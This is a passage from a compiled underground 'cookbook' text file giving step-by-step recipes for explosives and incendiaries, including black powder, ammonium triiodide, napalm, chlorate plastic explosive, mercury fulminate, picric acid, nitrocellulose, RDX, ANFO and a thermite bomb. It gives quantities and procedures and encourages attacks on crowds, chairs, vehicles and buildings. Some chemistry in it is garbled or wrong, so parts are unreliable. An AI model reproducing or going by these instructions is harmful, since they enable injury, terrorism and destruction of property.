separate plastic bag.

3) Place all of the finely ground potassium or sodium nitrate in the beaker,
   and add just enough boiling water to the chemical to get it all wet.

4) Add the contents of the other plastic bags to the wet potassium or sodium
nitrate, and mix them well for several minutes.  Do this until there is no
more visible sulfur or charcoal, or until the mixture is universally black.

5) On a warm sunny day, put the beaker outside in the direct sunlight.
  Sunlight is really the best way to dry black powder, since it is never too
  hot, but it is hot enough to evaporate the water.

6) Scrape the black powder out of the beaker, and store it in a safe
 container. Plastic is really the safest container, followed by paper.  Never
 store black powder in a plastic bag, since plastic bags are prone to generate
 static electricity.

Touch Explosives                         by the Jolly Roger

This is sort of a mild explosive, but it can be quite dangerous in 
large quantities. To make touch explosive (such as that found in a 
snap-n-pop, but more powerful), use this recipe:

- Mix iodine crystals into ammonia until the iodine crystals will 
not dissolve into the ammonia anymore. Pour off the excess ammonia 
and dry out the crystals on a baking sheet the same way as you 
dried the thermite (in other words, just let it sit overnight!).

- Be careful now because these crystals are now your touch 
explosive. Carefully wrap a bunch in paper (I mean carefully! 
Friction sets 'em off!) and throw them around.. pretty loud, huh?
They are fun to put on someone's chair. Add a small fish sinker to 
them and they can be thrown a long distance (good for crowds, 
football games, concerts, etc.) Have fun!  -Jolly Roger-

Napalm (Another way to make it...)              by the Jolly Roger

   (See file #021 of Cookbook IV for an easy way to make it!!)

About the best fire bomb is napalm. It has a thick consistancy,
like jam and is best for use on vehilces or buildings.
Napalms is simply one part gasoline and one part soap. The soap is
either soap flakes or shredded bar soap. Detergents won't do.
The gasoline must be heated in order for the soap to melt. The
usual way is with a double boiler where the top part has at least a
two-quart capicity. The water in the bottom part is brought to a boil
and the double boiler is taken from the stove and carried to where
there is no flame.
Then one part, by volume, of gasoline is put in the top part and
allowed to heat as much as it will and the soap is added and the mess
is stirred until it thickens. A better way to heat gasoline is to fill
a bathtub with water as hot as you can get it. It will hold its heat
longer and permit a much larger container than will the double boiler.

Procedure:
---------

CAUTION: Make sure that ther are no open flames in the area when mixing 
flame fuels! NO SMOKING!!

1) Seperate the egg white from the yolk. This can be done by breaking the 
egg into a dish and carefully removing the yolk with a spoon.
2) Pour egg white into a jar, bottle, or other container, and add gasoline.
3) Add the salt (or other additive) to the mixture and stir occasionally 
until gel forms (about 5 to 10 minutes).

NOTE: A thicker gelled flame fuel can be obtained by putting the capped jar 
in hot (65 degrees Centegrade) water for about 1/2 hour and then letting 
them cool to room temperature. (DO NOT HEAT THE GELLED FUEL CONTAINING 
COFFEE!!)

Potassium Nitrate is an ingredient in making fuses, among other 
things. Here is how you make it:

Materials needed:

 -3.5 gallons of nitrate bearing earth or other material
 -1/2 cup of wood ashes
 -Bucket or other similar container about 4-5 gallons in volume
 -2 pieces of finely woven cloth, each a bit bigger than the 
  bottom of the bucket
 -Shallow dish or pan at least as large in diameter as the bucket
 -Shallow, heat resistant container
 -2 gallons of water
 -Something to punch holes in the bottom of the bucket
 -1 gallon of any type of alcohol
 -A heat source
 -Paper & tape

Procedure:

 - Punch holes on the inside bottom of the bucket, so that the 
metal is"puckered" outward from the bottom

 - Spread cloth over the holes from the bottom

 - Place wood ashes on the cloth. Spread it out so that it covers 
the entire cloth and has about the same thickness.

 - Place 2nd cloth on top of the wood ashes

 - Place the dirt or other material in the bucket

 - Place the bucket over the shallow container. NOTE: It may need 
support on the bottom so that the holes on the bottom are not 
blocked.

 - Boil water and pour it over the earth very slowly. Do NOT pour 
it all at once, as this will clog the filter on the bottom.

 - Allow water to run through holes into the shallow dish on the 
bottom.

 - Be sure that the water goes through ALL of the earth!

 - Allow water in dish to cool for an hour or so

 - Carefully drain the liquid in the dish away, and discard the 
sludge in the bottom

 - Boil this liquid over a fire for at least two hours. Small 
grains of salt will form - scoop these out with the paper as they 
form

 - When the liquid has boiled down to 1/2 its original volume let 
it sit

 - After 1/2 hour, add equal volume of the alcohol; when this 
mixture is poured through paper, small white crystals appear. This 
is the posassium nitrate.

Purification:

 - Redissolve crystals in small amount of boiling water

 - Remove any crystals that appear

 - Pour through improvised filter then heat concentrated solution 
to dryness.

 - Spread out crystals and allow to dry



                     Compiled by -= RFLAGG =-Making Plastic Explosives from Bleach           by The Jolly Roger

Potassium chlorate is an extremely volatile explosive compound, 
and has been used in the past as the main explosive filler in 
grenades, land mines, and mortar rounds by such countries as 
France and Germany.  Common household bleach contains a small 
amount of potassium chlorate, which can be extracted by the 
procedure that follows.

First off, you must obtain:

[1]  A heat source (hot plate, stove, etc.)
[2]  A hydrometer, or battery hydrometer
[3]  A large Pyrex, or enameled steel container (to weigh 
     chemicals)
[4]  Potassium chloride (sold as a salt substitute at health and 
     nutrition stores)

Take one gallon of bleach, place it in the container, and begin 
heating it.  While this solution heats, weigh out 63 grams of 
potassium chloride and add this to the bleach being heated.  
Constantly check the solution being heated with the hydrometer, 
and boil until you get a reading of 1.3.  If using a battery 
hydrometer, boil until you read a FULL charge.

Take the solution and allow it to cool in a refrigerator until it 
is between room temperature and 0 degrees Celcius.  Filter out the 
crystals that have formed and save them.  Boil this solution again 
and cool as before.  Filter and save the crystals.

Take the crystals that have been saved, and mix them with 
distilled water in the following proportions:  56 grams per 100 
milliliters distilled water.  Heat this solution until it boils 
and allow to cool.  Filter the solution and save the crystals that 
form upon cooling.  This process of purification is called 
"fractional crystalization".  These crystals should be relatively 
pure potassium chlorate.

Powder these to the consistency of face powder, and heat gently to 
drive off all moisture.

Now, melt five parts Vaseline with five parts wax.  Dissolve this 
in white gasoline (camp stove gasoline), and pour this liquid on 
90 parts potassium chlorate (the powdered crystals from above) 
into a plastic bowl.  Knead this liquid into the potassium 
chlorate until intimately mixed.  Allow all gasoline to evaporate.

Finally, place this explosive into a cool, dry place.  Avoid 
friction, sulfur, sulfides, and phosphorous compounds.  This 
explosive is best molded to the desired shape and density of 1.3 
grams in a cube and dipped in wax until water proof.  These block 
type charges guarantee the highest detonation velocity.  Also, a 
blasting cap of at least a 3 grade must be used.

The presence of the afore mentioned compounds (sulfur, sulfides, 
etc.) results in mixtures that are or can become highly sensitive 
and will possibly decompose explosively while in storage.  You 
should never store homemade explosives, and you must use EXTREME 
caution at all times while performing the processes in this 
article.

Procedure
---------

1) Mix 1/2 cup of salt into the one gallon glass jar with 3 litres (3 
quarts) of water.
2) Add 2 teaspoons of battery acid to the solution and stir vigorously 
for 5 minutes.
3) Strip about 4 inches of insulation from both ends of the two wires.
4) With knife and sticks, shape 2 strips of wood 1 by 1/8 by 1-1/2. Tie 
the wood strips to the lead or carbon rods so that they are 1-1/2 incles 
apart.
5) Connect the rods to the battery in a motor vehicle with the insulated 
wire.
6) Submerge 4-1/2 inches of the rods in the salt water solution.
7) With gear in neutral position, start the vehicle engine. Depress the 
accelerator approx. 1/5 of its full travel.
8) Run the engine with the accelerator in this position for 2 hours, then 
shut it down for 2 hours.
9) Repeat this cycle for a total of 64 hours while maintaining the level 
of the acid-salt water solution in the glass jar.

CAUTION: This arrangement employs voltages which can be quite dangerous! 
Do not touch bare wire leads while engine is running!!

10) Shut off the engine. Remove the rods from the glass jar and 
disconnect wire leads from the battery.
11) Filter the solution through the heavy cloth into a flat pan or tray, 
leaving the sediment at the bottom of the glass jar.
12) Allow the water in the filtered solution to evaporate at room 
temperature (approx. 16 hours). The residue is approximately 60% or more 
sodium chlorate which is pure enough to be used as an explosive 
ingredient.

  MERCURY FULMINATE 2                           - Exodus -

     Mercury fulminate is perhaps one of the oldest known initiating
compounds. It can be detonated by either heat or shock, which would make it of
infinite value to a terrorist.  Even the action of dropping a crystal of the
fulminate causes it to explode.  A person making this material would probably
use the following procedure:

     MATERIALS                  EQUIPMENT
                       
     5 g mercury               glass stirring rod

     35 ml concentrated         100 ml beaker (2)
     nitric acid

     ethyl alcohol (30 ml)      adjustable heat source

     distilled water            blue litmus paper

                                funnel and filter paper

     Solvent alcohol must be at least 95% ethyl alcohol if it is used to make
mercury fulminate. Methyl alcohol may prevent mercury fulminate from forming.

     Mercury thermometers are becoming a rarity, unfortunately.  They may be
hard to find in most stores as they have been superseded by alcohol and other
less toxic fillings. Mercury is also used in mercury switches, which are
available at electronics stores. Mercury is a hazardous substance, and should
be kept in the thermometer or mercury switch until used. It gives off mercury
vapors which will cause brain damage if inhaled.  For this reason, it is a
good idea not to spill mercury, and to always use it outdoors. Also, do not
get it in an open cut; rubber gloves will help prevent this.

1) In one beaker, mix 5 g of mercury with 35 ml of concentrated nitric acid,
   using the glass rod.

2) Slowly heat the mixture until the mercury is dissolved, which is when the
   solution turns green and boils.

3) Place 30 ml of ethyl alcohol into the second beaker, and slowly and
   carefully add all of the contents of the first beaker to it.  Red and/or
   brown fumes should appear. These fumes are toxic and flammable.

4) After thirty to forty minutes, the fumes should turn white, indicating that
   the reaction is near completion.  After ten more minutes, add 30 ml of the
   distilled water to the solution.

5) Carefully filter out the crystals of mercury fulminate from the liquid
   solution.  Dispose of the solution in a safe place, as it is corrosive and
   toxic.

6) Wash the crystals several times in distilled water to remove as much excess
   acid as possible.  Test the crystals with the litmus paper until they are
   neutral.   This will be when the litmus paper stays blue when it touches
   the wet crystals

7) Allow the crystals to dry, and store them in a safe place, far away from
   any explosive or flammable material.

       This procedure can also be done by volume, if the available mercury
cannot be weighed.  Simply use 10 volumes of nitric acid and 10 volumes of
ethanol to every one volume of mercury.

    NITRIC ACID                               -= Exodus =-  '94

       There are several ways to make this most essential of all acids for  
explosives. One method by which it could be made will be presented. Once  
again, be reminded that these methods SHOULD NOT BE CARRIED OUT!!

     Materials:                             Equipment:
                                   
     sodium nitrate or                      adjustable heat source     
     potassium nitrate
                                            retort
     distilled water
                                            ice bath
     concentrated
     sulfuric acid                          stirring rod

                                            collecting flask with stopper

1) Pour 32 milliliters of concentrated sulfuric acid into the retort.

2) Carefully weigh out 58 grams of sodium nitrate, or 68 grams of potassium
nitrate. and add this to the acid slowly.  If it all does not dissolve,
carefully stir the solution with a glass rod until it does.

3) Place the open end of the retort into the collecting flask, and place the   
collecting flask in the ice bath.

4) Begin heating the retort, using low heat.  Continue heating until liquid
begins to come out of the end of the retort.  The liquid that forms is nitric
acid.  Heat until the precipitate in the bottom of the retort is almost dry,
or until no more nitric acid is forming.  CAUTION: If the acid is headed too
strongly, the nitric acid will decompose as soon as it is formed.  This can
result in the production of highly flammable and toxic gasses that may
explode.  It is a good idea to set the above apparatus up, and then get away
from it.

     Potassium nitrate could also be obtained from store-bought black powder,
simply by dissolving black powder in boiling water and filtering out the sulfur
and charcoal. To obtain 68 g of potassium nitrate, it would be necessary to
dissolve about 90 g of black powder in about one litre of boiling water. Filter
the dissolved solution through filter paper in a funnel into a jar until the
liquid that pours through is clear. The charcoal and sulfur in black powder are
insoluble in water, and so when the solution of water is allowed to evaporate,
potassium nitrate will be left in the jar.

     Picric acid, also known as Tri-Nitro-Phenol, or T.N.P., is a military
explosive that is most often used as a booster charge to set off another less
sensitive explosive, such as T.N.T.  It another explosive that is fairly
simple to make, assuming that one can acquire the concentrated sulfuric and
nitric acids.  Its procedure for manufacture is given in many college
chemistry lab manuals, and is easy to follow.  The main problem with picric
acid is its tendency to form dangerously sensitive and unstable picrate salts,
such as potassium picrate.  For this reason, it is usually made into a safer
form, such as ammonium picrate, also called explosive D.  A social deviant
would probably use a formula similar to the one presented here to make picric
acid.

     MATERIALS                         EQUIPMENT
                              
     phenol (9.5 g)                    500 ml flask

     concentrated                      adjustable heat source
     sulfuric acid  (12.5 ml)
                                       1000 ml beaker
     concentrated nitric               or other container
     acid (38 ml)                      suitable for boiling in

     distilled water                   filter paper
                                       and funnel

                                       glass stirring rod


1) Place 9.5 grams of phenol into the 500 ml flask, and carefully add 12.5 ml
   of concentrated sulfuric acid and stir the mixture.

2) Put 400 ml of tap water into the 1000 ml beaker or boiling container and
   bring the water to a gentle boil.

3) After warming the 500 ml flask under hot tap water, place it in the boiling
   water, and continue to stir the mixture of phenol and acid for about thirty
   minutes.  After thirty minutes, take the flask out, and allow it to cool
   for about five minutes.

4) Pour out the boiling water used above, and after allowing the container to
   cool, use it to create an ice bath, similar to the one used in section
   3.13, steps 3-4.  Place the 500 ml flask with the mixed acid an phenol in
   the ice bath.  Add 38 ml of concentrated nitric acid in small amounts,
   stirring the mixture constantly.  A vigorous but "harmless" reaction should
   occur.  When the mixture stops reacting vigorously, take the flask out of
   the ice bath.

5) Warm the ice bath container, if it is glass, and then begin boiling more
   tap water.  Place the flask containing the mixture in the boiling water,
   and heat it in the boiling water for 1.5 to 2 hours.

6) Add 100 ml of cold distilled water to the solution, and chill it in an ice
   bath until it is cold.

7) Filter out the yellowish-white picric acid crystals by pouring the solution
   through the filter paper in the funnel.  Collect the liquid and dispose of
   it in a safe place, since it is corrosive.

8) Wash out the 500 ml flask with distilled water, and put the contents of the
   filter paper in the flask.  Add 300 ml of water, and shake vigorously.

9) Re-filter the crystals, and allow them to dry.

10) Store the crystals in a safe place in a glass container, since they will
    react with metal containers to produce picrates that could explode
    spontaneously.


  AMMONIUM TRIIODIDE CRYSTALS

     Ammonium triiodide crystals are foul-smelling purple colored crystals
that decompose under the slightest amount of heat, friction, or shock, if they
are made with the purest ammonia (ammonium hydroxide) and iodine.  Such
crystals are said to detonate when a fly lands on them, or when an ant walks
across them. Household ammonia, however, has enough impurities, such as soaps
and abrasive agents, so that the crystals will detonate when thrown,crushed,
or heated. Ammonia, when bought in stores comes in a variety of forms.  The
pine and cloudy ammonias should not be bought; only the clear ammonia should
be used to make ammonium triiodide crystals. Upon detonation, a loud report is
heard, and a cloud of purple iodine gas appears about the detonation site.
Whatever the unfortunate surface that the crystal was detonated upon will
usually be ruined, as some of the iodine in the crystal is thrown about in a
solid form, and iodine is corrosive.  It leaves nasty, ugly, permanent
brownish-purple stains on whatever it contacts. Iodine gas is also bad news,
since it can damage lungs, and it settles to the ground and stains things
there also.  Touching iodine leaves brown stains on the skin that last for
about a week, unless they are immediately and vigorously washed off.  While
such a compound would have little use to a serious terrorist, a vandal could
utilize them in damaging property.  Or, a terrorist could throw several of
them into a crowd as a distraction, an action which would possibly injure a
few people, but frighten almost anyone, since a small crystal that may not be
seen when thrown produces a rather loud explosion.

    Ammonium triiodide crystals could be produced in the following manner:

     Materials                Equipment
                     
     iodine crystals          funnel and filter paper
                              paper towels
     clear ammonia
     (ammonium hydroxide,     two throw-away glass jars
      for the suicidal)

1) Place about two teaspoons of iodine into one of the glass jars.  The jars
   must both be throw away because they will never be clean again.

2) Add enough ammonia to completely cover the iodine.

3) Place the funnel into the other jar, and put the filter paper in the
   funnel. The technique for putting filter paper in a funnel is taught in
   every basic chemistry lab class: fold the circular paper in half, so that a
   semi-circle is formed.  Then, fold it in half again to form a triangle with
   one curved side.  Pull one thickness of paper out to form a cone, and place
   the cone into the funnel.

4) After allowing the iodine to soak in the ammonia for a while, pour the
   solution into the paper in the funnel through the filter paper.

5) While the solution is being filtered, put more ammonia into the first jar
   to wash any remaining crystals into the funnel as soon as it drains.

6) Collect all the purplish crystals without touching the brown filter paper,
   and place them on the paper towels to dry for about an hour.  Make sure
   that they are not too close to any lights or other sources of heat, as they
   could well detonate. While they are still wet, divide the wet material into
   eight pieces of about the same size.

7) After they dry, gently place the crystals onto a one square inch piece of
   duct tape.  Cover it with a similar piece, and gently press the duct tape
   together around the crystal, making sure not to press the crystal itself.
   Finally, cut away most of the excess duct tape with a pair of scissors, and
   store the crystals in a cool dry safe place.  They have a shelf life of
   about a week, and they should be stored in individual containers that can
   be thrown away, since they have a tendency to slowly decompose, a process
   which  gives off iodine vapors, which will stain whatever they settle on.
   One possible way to increase their shelf life is to store them in airtight
   containers.  To use them, simply throw them against any surface or place
   them where they will be stepped on or crushed.

    SULFURIC ACID                                     by Exodus

     Sulfuric acid is far too difficult to make outside of a laboratory or
industrial plant.  However, it is readily available in an uncharged car
battery. A person wishing to make sulfuric acid would simply remove the top of
a car battery and pour the acid into a glass container.  There would probably
be pieces of lead from the battery in the acid which would have to be removed,
either by boiling or filtration.  The concentration of the sulfuric acid can
also be increased by boiling it; very pure sulfuric acid pours slightly faster
than clean motor oil.


   AMMONIUM NITRATE

     Ammonium nitrate is a very powerful but insensitive high-order explosive.
It could be made very easily by pouring nitric acid into a large flask in an ice
bath. Then, by simply pouring household ammonia into the flask and running away,
ammonium nitrate would be formed. After the materials have stopped reacting, one
would simply have to leave the solution in a warm place until all of the water
and any unneutralized ammonia or acid have evaporated. There would be a fine
powder formed, which would be ammonium nitrate. It must be kept in an airtight
container, because of its tendency to pick up water from the air.  The crystals
formed in the above process would have to be heated VERY gently to drive off the
remaining water.


PRODUCING CELLULOSE NITRATE   (From andrew at CMU)

 I used to make nitrocellulose, though. It was not guncotton grade, because I
didn't have oleum (H2SO4 with dissolved SO3); nevertheless it worked. At first
I got my H2SO4 from a little shop in downtown Philadelphia, which sold
soda-acid fire extinguisher refills. Not only was the acid concentrated, cheap
and plentiful, it came with enough carbonate to clean up. I'd add KNO3 and a
little water (OK, I'd add the acid to the water - but there was so little
water, what was added to what made little difference. It spattered
concentrated H2SO4 either way). Later on, when I could purchase the acids, I
believe I used 3 parts H2SO4 to 1 part HNO3. For cotton, I'd use cotton wool
or cotton cloth.

 Runaway nitration was commonplace, but it is usually not so disasterous with
nitrocellulose as it is with nitroglycerine. For some reason, I tried washing
the cotton cloth in a solution of lye, and rinsing it well in distilled water.
I let the cloth dry and then nitrated it. (Did I read this somewhere?) When
that product was nitrated, I never got a runaway reaction. BTW, water quenched
the runaway reaction of cellulose.

The product was washed thoroughly and allowed to dry. It dissolved (or turned
into mush) in acetone. It dissolved in alcohol/ether.

                                   WARNINGS

 All usual warnings regarding strong acids apply. H2SO4 likes to spatter. When
it falls on the skin, it destroys tissue - often painfully. It dissolves all
manner of clothing. Nitric also destroys skin, turning it bright yellow in the
process. Nitric is an oxidant - it can start fires. Both agents will happily
blind you if you get them in your eyes. Other warnings also apply. Not for the
novice.

 Nitrocellulose decomposes very slowly on storage if it isn't stablized. The
decomposition is auto- catalyzing, and can result in spontaneous explosion if
the material is kept confined over time. The process is much faster if the
material is not washed well enough. Nitrocellulose powders contain stabilizers
such as diphenyl amine or ethyl centralite. DO NOT ALLOW THESE TO COME INTO
CONTACT WITH NITRIC ACID!!!! A small amount of either substance will capture
the small amounts of nitrogen oxides that result from decomposition. They
therefore inhibit the autocatalysis. NC eventually will decompose in any case.

Again, this is inherently dangerous and illegal in certain areas. I got away
with it. You may kill yourself and others if you try it.

Commercially produced Nitrocellulose is stabilized by:
------------------------------------------------------


1. Spinning it in a large centrifuge to remove the remaining acid, which is
   recycled.

2. Immersion in a large quantity of fresh water.

3. Boiling it in acidulated water and washing it thoroughly with fresh water.

   If the NC is to be used as smokeless powder it is boiled in a soda solution,
then rinsed in fresh water.

   The purer the acid used (lower water content) the more complete the
nitration will be, and the more powerful the nitrocellulose produced.

   There are actually three forms of cellulose nitrate, only one of which is
useful for pyrotechnic purposes. The mononitrate and dinitrate are not
explosive, and are produced by incomplete nitration. If nitration is allowed
to proceed to complete the explosive trinatrate is formed.

     Nitrocellulose is usually called "gunpowder" or "guncotton".  It is more
stable than black powder, and it produces a much greater volume of hot gas.  It
also burns much faster than black powder when it is in a confined space.
Finally, nitrocellulose is fairly easy to make, as outlined by the following
procedure:


     MATERIALS                    EQUIPMENT
                         
     cotton  (cellulose)          two (2) 200-300 ml beakers

     concentrated                 funnel and filter paper

     concentrated
     sulfuric acid

     distilled water



1) Pour 10 cc of concentrated sulfuric acid into the beaker.  Add to this    10
cc of concentrated nitric acid.

2) Immediately add 0.5 gm of cotton, and allow it to soak for exactly 3   
minutes.

3) Remove the nitrocotton, and transfer it to a beaker of distilled water    to
wash it in.

4) Allow the material to dry, and then re-wash it.

5) After the cotton is neutral when tested with litmus paper, it is ready to   
be dried and stored.

    R.D.X. 2

     R.D.X., also called cyclonite, or composition C-1 (when mixed with
plasticisers) is one of the most valuable of all military explosives.  This is
because it has more than 150% of the power of T.N.T., and is much easier to
detonate.  It should not be used alone, since it can be set off by a not-too
severe shock.  It is less sensitive than mercury fulminate, or nitroglycerine,
but it is still too sensitive to be used alone.

 R.D.X. can be made by the surprisingly simple method outlined hereafter.  It
is much easier to make in the home than all other high explosives, with the
possible exception of ammonium nitrate.

     MATERIALS                    EQUIPMENT
                         
     hexamine                     500 ml beaker
       or
     methenamine                  glass stirring rod
     fuel tablets (50 g)
                                  funnel and filter paper
     concentrated
     nitric acid (550 ml)         ice bath container  (plastic bucket)

     distilled water              centigrade thermometer

     table salt                   blue litmus paper

     ice                          ammonium nitrate


1) Place the beaker in the ice bath, (see section 3.13, steps 3-4) and carefully 
   pour 550 ml of concentrated nitric acid into the beaker.

2) When the acid has cooled to below 20 degrees centigrade, add small amounts
   of the crushed fuel tablets to the beaker.  The temperature will rise, and
   it must be kept below 30 degrees centigrade, or dire consequences could
   result. Stir the mixture.

3) Drop the temperature below zero degrees centigrade, either by adding more
   ice and salt to the old ice bath, or by creating a new ice bath.  Or,
   ammonium nitrate could be added to the old ice bath, since it becomes cold
   when it is put in water. Continue stirring the mixture, keeping the
   temperature below zero degrees centigrade for at least twenty minutes

4) Pour the mixture into a litre of crushed ice.  Shake and stir the mixture,
   and allow it to melt.  Once it has melted, filter out the crystals, and
   dispose of the corrosive liquid.

5) Place the crystals into one half a litre of boiling distilled water. Filter
   the crystals, and test them with the blue litmus paper.  Repeat steps 4 and
   5 until the litmus paper remains blue.  This will make the crystals more
   stable and safe.

6) Store the crystals wet until ready for use. Allow them to dry completely
    using them. R.D.X. is not stable enough to use alone as an explosive.

7) Composition C-1 can be made by mixing 88.3% R.D.X. (by weight) with 11.1%
   mineral oil, and 0.6% lecithin. Kneed these material together in a plastic
   bag. This is one way to desensitize the explosive.

8) H.M.X. is a mixture of T.N.T. and R.D.X.; the ratio is 50/50, by weight.   
  it is not as sensitive, and is almost as powerful as straight R.D.X.

9) By adding ammonium nitrate to the crystals of R.D.X. after step 5, it
   should be possible to desensitize the R.D.X. and increase its power, since
   ammonium nitrate is very insensitive and powerful. Soduim or potassium
   nitrate could also be added; a small quantity is sufficient to stabilize
   the R.D.X.

10) R.D.X. detonates at a rate of 8550 meters/second when it is compressed to a  
   density of 1.55 g/cubic cm.

     ANFOS

     ANFO is an acronym for Ammonium Nitrate - Fuel Oil Solution.  An ANFO
solves the only other major problem with ammonium nitrate: its tendency to
pick up water vapor from the air.  This results in the explosive failing to
detonate when such an attempt is made.  This is rectified by mixing 94% (by
weight) ammonium nitrate with 6% fuel oil, or kerosene.  The kerosene keeps
the ammonium nitrate from absorbing moisture from the air.  An ANFO also
requires a large shockwave to set it off.


     About ANFO            (From Dean S.)

  Lately there was been a lot said about various ANFO mixtures.  These are
mixtures of Ammonium Nitrate with Fuel Oil.  This forms a reasonably powerful
commercial explosive, with its primary benifit being the fact that it is
cheap.  Bulk ANFO should run somewhere around 9-12 cents the pound. This is
dirt cheap compared to 40% nitro gel dynamites at 1 to 2 dollars the pound. To
keep the cost down, it is frequently mixed at the borehole by a bulk truck,
which has a pneumatic delivery hopper of AN prills (thats pellets to most of
the world) and a tank of fuel oil.  It is strongly recommended that a dye of
some sort, preferably red be added to the fuel oil to make it easier to
distinguish treated AN explosive from untreated oxidizer.

   ANFO is not without its problems.  To begin with, it is not that sensitive
to detonation.  Number eight caps are not reliable when used with ANFO.
Booster charges must be used to avoid dud blast holes.  Common boosters
include sticks of various dynamites, small pours of water gel explosives,
dupont's detaprime cast boosters, and Atlas's power primer cast explosive. The
need to use boosters raises the cost.  Secondly, ANFO is very water
susceptable.  It dissolves in it, or absorbes it from the atmosphere, and
becomes quite worthless real quick.  It must be protected from water with
borehole liners, and still must be shot real quick.  Third, ANFO has a low
density, somewhere around .85.  This means ANFO sacks float, which is no good,
and additionally, the low density means the power is somewhat low. Generally,
the more weight of explosive one can place in a hole, the more effective.
ANFO blown into the hole with a pneumatic system fractures as it is places,
raising the density to about .9 or .92.  The delivery system adds to the cost,
and must be anti static in nature.  Aluminum is added to some commercial,
cartridge packaged ANFOs to raise the density---this also raises power
considerable, and a few of these mixtures are reliablly cap sensitive.

  Now than, for formulations.  An earlier article mentioned 2.5 kilos of
ammonium nitrate, and I believe 5 to 6 liters of diesel.  This mixture is
extremely over fueled, and I'd be surprised if it worked.  Dupont recommends a
AN to FO ratio of 93% AN to 7% FO by weight.  Hardly any oil at all.  More oil
makes the mixture less explosive by absorbing detonation energy, and excess
fuel makes detonation byproducts health hazzards as the mixture is oxygen
poor.  Note that commercial fertilizer products do not work as well as the
porous AN prills dupont sells, because fertilizers are coated with various
materials meant to seal them from moisture, which keep the oil from being
absorbed.

   Another problem with ANFO:  for reliable detonation, it needs confinement,
either from a casing, borehole, etc, or from the mass of the charge.  Thus, a
pile of the stuff with a booster in it is likely to scatter and burn rather
than explode when the booster is shot.  In boreholes, or reasonable strong
casings (cardboard, or heavy plastic film sacks) the stuff detonated quite
well.  So will big piles.  Thats how the explosive potential was discovered: a
small oil freighter rammed a bulk chemical ship.  Over several hours the
cargoes intermixed to some degree, and reached critical mass.  Real big bang.
A useful way to obtain the containment needed is to replace the fuel oil with
a wax fuel.  Mix the AN with just enough melted wax to form a cohesive
mixture, mold into shape.  The wax fuels, and retains the mixture. This is
what the US military uses as a man placed cratering charge.  The military
literature states this can be set off by a blasting cap, but it is important
to remember the military blasting caps are considerable more powerful than
commercial ones.  The military rightly insists on reliability, and thus a
strong cap (maybe 70-80 percent stronger than commercial).  They also tend to
go overboard when calculating demolition charges...., but then hey, who
doesn't....

   Two manuals of interest:  Duponts "Blaster's Handbook", a $20 manual mainly
useful for rock and seismographic operations.  Atlas's "Powder Manual" or
"Manual of Rock Blasting" (I forget the title, its in the office).  This is a
$60 book, well worth the cash, dealing with the above two topics, plus
demolitions, and non-quarry blasting.

    Incidently, combining fuel oil and ammonium nitrate constitutes the
manufacture of a high explosive, and requires a federal permit to manufacture
and store. Even the mines that mix it on site require the permit to
manufacture.  Those who don't manufacture only need permits to store.  Those
who don't store need no permits, which includes most of us:  anyone, at least
in the US may purchase explosives, provided they are 21 or older, and have no
criminal record.  Note they ought to be used immediately, because you do need
a liscence to store. Note also that commercial explosives contain quantities
of tracing agents, which make it real easy for the FBI to trace the explosion
to the purchaser, so please, nobody blow up any banks, orphanages, or old
folks homes, okay.

		.... Thermite Incendiaries and Formulas ....



DISCLAIMER : The making and possesion of the following devices and mixtures
	     is probably illegal in most communities. The incendiaries are
	     capable of burning in excess of 5400 degrees F. and are next
	     to impossible to extinguish. If you make them you accept all
	     responsibility for their possesion and use. You also accept
	     all responsibility for your own stupidity and carelessness.
	     This information is intended solely to educate.

			 All Formulas are by Weight

  Thermites are a group of pyrotechnics mixtures in which a reactive metal
reduces oxygen from a metallic oxide. This produces a lot of heat, slag and
pure metal. The most common themite is ferroaluminum thermite, made from
aluminum (reactive metal) and iron oxide (metal oxide). When it burns it
produces aluminum oxide (slag) and pure iron.
Thermite is usually used to cut or weld metal. As an experiment, a 3lb. brick
of thermite was placed on an aluminum engine block. After the thermite was
done burning, only a small portion of block was melted. However, the block
was very warped out of shape plus there were cracks all through the block.
Ferro-thermite produces about 930 calories per gram
The usual proportions of ferro-thermite are 25% aluminum and 75% iron oxide
The iron oxide usually used is not rust (Fe2O3) but iron scale (Fe3O4).Rust
will work but you may want to adjust the mixture to about 77% rust.
The aluminum is usually coarse powder to help slow down the burning rate.
The chemicals are mixed together thoroughly and compressed into a suitable
container. A first fire mix is poured on top and ignited.

NOTE: Thermites are generally very safe to mix and store. They are not shock
or friction sensitive and ignite at about 2000 degrees F.

A first fire mix is a mixture that ignites easier than thermite and burns
hot enough to light the thermite reliably. A very good one is :
		  Potassium Nitrate 5 parts
	       Fine ground Aluminum 3 parts        
			     Sulfur 2 parts
			     
Mix the above thoroughly and combine 2 parts of it with 1 part of finely 
powdered ferro-thermite. The resulting mixture can be light by safety fuse
and burns intensely.


One problem with thermites is the difference in weight between the aluminum
and the oxide. This causes them to separate out rendering the thermite 
useless. One way to fix this is to use a binder to hold the chemicals to
each other. Sulfur is good for this. Called Diasite, this formula uses 
sulfur to bind all the chemicals together. It's drawback is the thermite 
must be heated to melt the sulfur.
			    Iron Oxide 70 %
			    Aluminum   23 %
			    Sulfur      7 %

Mix the oxide and aluminum together and put them in an oven at 325 degrees
F. and let the mix heat for a while. When the mixture is hot sprinkle the
sulfur over it and mix well. Put this back in the oven for a few minutes
to melt all the sulfur. Pull it back out and mix it again. While it is
still hot, load into containers for use. When it cools, drill out the
diasite to hold about 10 - 15 grams of first fire mix.
When diasite burns it forms sulfide compounds that release hydrogen sulfide
when in contact with water. This rotten egg odor can hamper fire fighting
efforts.
Thermite can be made not to separate by compressing it under a couple of
tons pressure. The resulting pellet is strong and burns slower than thermite
powder.

CAST THERMITE: This formula can be cast into molds or containers and hardens
into a solid mass. It does not produce as much iron as regular ferro-thermite
, but it makes a slag which stays liquid a lot longer. Make a mixtures as 
follows.
			      Plaster of Paris 2 parts
	       Fine and Coarse  Mixed Aluminum 2 parts 
				    Iron Oxide 3 parts
Mix together well and and enough water to wet down plaster. Pour it into a
mold and let it sit for 1/2 hour. Pour off any extra water that seperates
out on top. Let this dry in the sun for at least a week. Or dry in the sun
for one day and put in a 250 degree F. oven for a couple of hours.
Drill it out for a first fire mix when dry.

THERMITE BOMB: Thermite can be made to explode by taking the cast thermite
formula and substituting fine powdered aluminum for the coarse/fine mix.
Take 15 grams of first fire mix and put in the center of a piece of aluminum
foil. Insert a waterproof fuse into the mix and gather up the foil around 
the fuse. Waterproof the foil/fuse with a thin coat of wax. Obtain a two-
piece spherical mold with a diameter of about 4-5 inches. Wax or oil the 
inside of the mold to help release the thermite. Now, fill one half of the
mold with the cast thermite. Put the first fire/fuse package into the center
of the filled mold. Fill the other half of the mold with the thermite and
